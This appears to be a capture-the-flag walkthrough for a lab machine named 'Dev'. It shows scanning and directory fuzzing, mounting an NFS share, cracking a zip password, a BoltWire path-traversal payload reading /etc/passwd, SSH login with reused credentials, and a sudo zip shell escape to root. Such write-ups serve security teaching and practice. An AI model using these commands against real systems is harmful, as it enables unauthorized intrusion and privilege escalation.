# Dev Walkthrough

## Enumeration
```bash
nmap -A -T4 -p- $IP -oA $IP-dev-scan
```
Of interest to us are ports: 80, 2049, and 8080
![[Pasted image 20220224132019.png]]
On port 80, it's seems to be running Bolt CMS but this shows us an error page and on port 8080, we see that it's a PHP running PHP Version 7.3.27-1

Let's fuzz against port 80 and 8080. Make sure to replace the IP address with your target IP:
For port 80 do:
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.122.179/FUZZ
```

For port 8080 do:
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.122.179:8080/FUZZ
```

From the result, we see that for both ports, there is a `server-status` page.
Port 80 fuzz results:
![[Pasted image 20220224134908.png]]
Port 8080 fuzz results:
![[Pasted image 20220224135005.png]]

We can try to mount the nfs directory:
![[Pasted image 20220224133732.png]]
First, make a directory, with sudo privileges, in `/mnt` called `/mnt/dev`
```bash
sudo mkdir /mnt/dev
```
Then mount the directory to `/mnt/dev`:
```bash
sudo mount -t nfs 192.168.122.179:/srv/nfs /mnt/dev
```
After changing into the directory and list out it's contents we see that there is a password protected zip file called `save.zip`. Make sure to install `sudo apt install fcrackzip` to crack the zip so that we can get the password and unzip it.
![[Pasted image 20220224134255.png]]
```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```
Using `java101` as the password, we use `unzip save.zip` and find 2 files: `id_rsa` and `todo.txt`

If we browse to the directories listed after we had fuzzed the ports, we find someing at `http://192.168.122.179/app/`
![[Pasted image 20220224135445.png]]

Might come in handy from file `config.yml`:
![[Pasted image 20220224135625.png]]
```bash
username: bolt
password: I_love_java
```
Let's create a new user. We will use the credentials `hacker:hacker` in our example. We don't find anything that we can do with this so search on Google for "boltwire exploit". You can also do `searchsploit boltwire`.
![[Pasted image 20220224223245.png]]
Let's use the exploit for LFI. The link to the exploit: https://www.exploit-db.com/exploits/48411
![[Pasted image 20220224223438.png]]
Make sure you have a registered user and paste it into this into the URL: `index.php?p=action.search&action=../../../../../../../etc/passwd
`
Notice that we have LFI
![[Pasted image 20220224223810.png]]
`johnpaul` is a user that has `/bin/bash` access:
![[Pasted image 20220224224102.png]]
Let's use `johnpaul` to `ssh` into the server. We will try to use the password that we got from the `config.yml` file.
![[Pasted image 20220224224537.png]]
It works!
Try to see what `jeanpaul` can execute:
![[Pasted image 20220224224745.png]]
We can escalate privileges by going out to https://gtfobins.github.io/gtfobins/zip/ and copy/pasting and executing the first two lines: 
![[Pasted image 20220224225207.png]]
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```
We have root!
![[Pasted image 20220224225510.png]]
